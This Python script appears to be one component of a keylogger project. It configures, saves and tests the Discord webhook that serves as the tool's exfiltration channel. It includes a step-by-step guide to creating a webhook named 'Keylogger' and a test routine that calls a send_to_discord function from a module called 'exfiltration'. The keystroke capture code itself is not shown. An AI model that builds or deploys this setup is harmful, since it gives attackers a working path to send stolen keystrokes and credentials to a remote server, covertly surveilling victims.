#!/usr/bin/env python3
"""Discord webhook setup and testing"""

import sys
from config import set_webhook, get_webhook, load_config, save_config


def show_discord_setup():
    """Display Discord webhook configuration guide."""
    print("""
        Discord Webhook Configuration

        Steps:

        1. Create a Discord server or use an existing one

        2. Create a webhook:
        - Right-click server → Server Settings
        - Go to "Integrations"
        - Click "Create Webhook"
        - Give it a name (ex: "Keylogger")
        - Copy the webhook URL
        - URL format:
            https://discord.com/api/webhooks/123456789/abcdefg...

        3. Keep this URL secret!
    """)


def test_webhook(webhook_url: str):
    print(f"\n[*] Testing webhook...")
    
    from exfiltration import send_to_discord
    
    success = send_to_discord(webhook_url)
    
    if success:
        print("[+] Webhook works! Check Discord.")
    else:
        print("[!] Error - Check webhook URL")


def main():
    """Entry point."""
    if len(sys.argv) > 1:
        if sys.argv[1] == "setup":
            show_discord_setup()
        elif sys.argv[1] == "set":
            if len(sys.argv) > 2:
                set_webhook(sys.argv[2])
            else:
                print("Usage: python discord_setup.py set <webhook_url>")
        elif sys.argv[1] == "test":
            if len(sys.argv) > 2:
                test_webhook(sys.argv[2])
            else:
                url = get_webhook()
                if url:
                    test_webhook(url)
                else:
                    print("No webhook configured. Run: python discord_setup.py set <URL>")
        elif sys.argv[1] == "show":
            config = load_config()
            print("\nCurrent configuration:")
            print(f"  Webhook: {config.get('webhook_url', 'Not set')}")
            print(f"  Bot token: {'Set' if config.get('bot_token') else 'Not set'}")
        else:
            print(f"Unknown command: {sys.argv[1]}")
    else:
        print("""
Usage: python discord_setup.py [command]

Commands:
  setup              Show setup guide
  set <url>          Save webhook URL
  test [url]         Test webhook (uses saved URL if not provided)
  show               Show current config

Examples:
  python discord_setup.py setup
  python discord_setup.py set https://discord.com/api/webhooks/...
  python discord_setup.py test

After setup, run monitoring with:
  python main.py --webhook auto    (uses saved webhook)
  python main.py                    (console only)
        """)


if __name__ == "__main__":
    main()
